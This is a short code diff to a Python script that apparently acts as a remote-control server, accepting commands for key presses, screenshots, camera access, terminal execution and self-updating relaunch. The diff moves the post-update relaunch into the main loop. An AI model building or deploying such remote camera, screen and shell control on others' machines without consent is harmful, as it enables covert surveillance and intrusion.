@@ -112,10 +112,10 @@ def execute(data):
         press(data[6:len(data) - 1])
     elif data == "update":
         modif.update(url)
-        os.system(getFileName())
+        ossys = True
     elif data =="updelte":
         modif.update(url, delete=True)
-        os.system(getFileName())
+        ossys = True
     elif data == "screen":
         screen()
     elif data == "camera":
@@ -129,7 +129,7 @@ def execute(data):
         terminal(data)
 
 run = True
-
+ossys = False
 while run == True:
     sortir = True
     ipScreen = "192.168.1.48"
@@ -141,6 +141,8 @@ while run == True:
     ip = s.getsockname()[0]
     s.close()
     
+    if ossys == True:
+        os.system(getFileName())
     
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((ip, port))
